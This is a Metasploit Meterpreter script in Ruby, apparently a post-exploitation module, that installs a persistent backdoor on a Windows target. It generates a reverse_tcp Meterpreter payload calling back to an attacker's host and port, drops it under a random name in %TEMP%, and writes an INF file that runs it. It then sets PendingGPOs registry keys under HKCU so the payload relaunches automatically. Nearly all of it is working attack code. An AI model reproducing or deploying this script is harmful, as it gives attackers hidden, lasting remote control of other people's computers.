#####################################
##     Created by @NaxoneZ         ##
#####################################
#####################################
## Script Persistencia PendingGPOs ##
#####################################

#Default parameters for payload
#-------------------------------------------------------------------------------
rhost = Rex::Socket.source_address("1.2.3.4")
rport = 4444
payload_type = "windows/meterpreter/reverse_tcp"


#Parameters
#-------------------------------------------------------------------------------
@exec_opts = Rex::Parser::Arguments.new(
  "-h"  => [ false,  "This help menu"],
  "-r"  => [ true,   "The IP of the system running Metasploit listening for the connect back"],
  "-p"  => [ true,   "The port on which the system running Metasploit is listening"],
)


# Usage Message Function
#-------------------------------------------------------------------------------
def usage
  print_line "Meterpreter Script modified for creating a persistent backdoor on a target host using PendingGPOs."
  print_line(@exec_opts.usage)
  raise Rex::Script::Completed
end

#Default parameters for files
#-------------------------------------------------------------------------------
pathFile = @client.fs.file.expand_path("%TEMP%")
infName = Rex::Text.rand_text_alpha((rand(8)+6)) + ".inf"
exeName = Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"
serviceName = Rex::Text.rand_text_alpha((rand(10)+6))
infFile = pathFile + "\\" + infName
exeFile = pathFile + "\\" + exeName

#==============================================================================#
#==============================================================================#

# Function for Creating the Payload
#-------------------------------------------------------------------------------
def create_payload(payload_type,lhost,lport)
  print_status("Creating Payload=#{payload_type} LHOST=#{lhost} LPORT=#{lport}")
  payload = payload_type
  pay = client.framework.payloads.create(payload)
  pay.datastore['LHOST'] = lhost
  pay.datastore['LPORT'] = lport
  return pay.generate
end


# Function to install payload in to the registry HKLM or HKCU
#-------------------------------------------------------------------------------
def write_to_reg(script_on_target)
  key_path = "HKCU\\Software\\Microsoft\\IEAK\\GroupPolicy\\PendingGPOs"
  registry_createkey(key_path)
  registry_setvaldata("#{key_path}", "Path1", script_on_target, "REG_SZ")
  registry_setvaldata("#{key_path}", "Section1", "DefaultInstall", "REG_SZ")
  registry_setvaldata("#{key_path}", "Count", "1", "REG_DWORD")
  print_good("Installed into autorun as #{key_path}")
end

# Function for writing script to target host
#-------------------------------------------------------------------------------
def write_script_to_target(file, contentFile)
  fd = @client.fs.file.new(file, "wb")
  fd.write(contentFile)
  fd.close
  print_good("Persistent Script written to #{file}")
end

#==============================================================================#
#==============================================================================#

# Main
#-------------------------------------------------------------------------------
@exec_opts.parse(args) { |opt, idx, val|
case opt
  when "-h"
    usage
  when "-r"
    rhost = val
  when "-p"
    rport = val.to_i
end
}

# call for writing executable with payload in system
#-------------------------------------------------------------------------------
write_script_to_target(exeFile,::Msf::Util::EXE.to_win32pe(client.framework,create_payload(payload_type, rhost, rport)))

# call for writing inf
#-------------------------------------------------------------------------------
write_script_to_target(infFile,"[Version]\r\nsignature = '$CHICAGO$'\r\nAdvancedINF = 2.5,'Persistence for All!'\r\n[DefaultInstall]\r\nRunPreSetupCommands = "+ serviceName +":2\r\n["+ serviceName +"]\r\n" + exeFile)

# call for writing registry
#-------------------------------------------------------------------------------
write_to_reg(pathFile + "\\" + infName)
